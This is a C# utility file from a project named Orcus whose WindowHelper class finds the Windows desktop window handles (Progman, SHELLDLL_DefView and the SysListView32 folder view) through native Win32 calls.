using System;
using System.Text;
using Orcus.Native;

namespace Orcus.Utilities
{
    internal static class WindowHelper
    {
        public static IntPtr GetDesktopWindow(DesktopWindow desktopWindow)
        {
            IntPtr progMan = NativeMethods.GetShellWindow();
            IntPtr shelldllDefViewParent = progMan;
            IntPtr shelldllDefView = NativeMethods.FindWindowEx(progMan, IntPtr.Zero, "SHELLDLL_DefView", null);
            IntPtr sysListView32 = NativeMethods.FindWindowEx(shelldllDefView, IntPtr.Zero, "SysListView32",
                "FolderView");

            if (shelldllDefView == IntPtr.Zero)
            {
                NativeMethods.EnumWindows((hwnd, lParam) =>
                {
                    const int maxChars = 256;
                    StringBuilder className = new StringBuilder(maxChars);

                    if (NativeMethods.GetClassName(hwnd, className, maxChars) > 0 && className.ToString() == "WorkerW")
                    {
                        IntPtr child = NativeMethods.FindWindowEx(hwnd, IntPtr.Zero, "SHELLDLL_DefView", null);
                        if (child != IntPtr.Zero)
                        {
                            shelldllDefViewParent = hwnd;
                            shelldllDefView = child;
                            sysListView32 = NativeMethods.FindWindowEx(child, IntPtr.Zero, "SysListView32", "FolderView");
                            return false;
                        }
                    }
                    return true;
                }, IntPtr.Zero);
            }

            switch (desktopWindow)
            {
                case DesktopWindow.ProgMan:
                    return progMan;
                case DesktopWindow.SHELLDLL_DefViewParent:
                    return shelldllDefViewParent;
                case DesktopWindow.SHELLDLL_DefView:
                    return shelldllDefView;
                case DesktopWindow.SysListView32:
                    return sysListView32;
                default:
                    return IntPtr.Zero;
            }
        }
    }

    // ReSharper disable InconsistentNaming
    internal enum DesktopWindow
    {
        ProgMan,
        SHELLDLL_DefViewParent,
        SHELLDLL_DefView,
        SysListView32
    }

    // ReSharper restore InconsistentNaming
}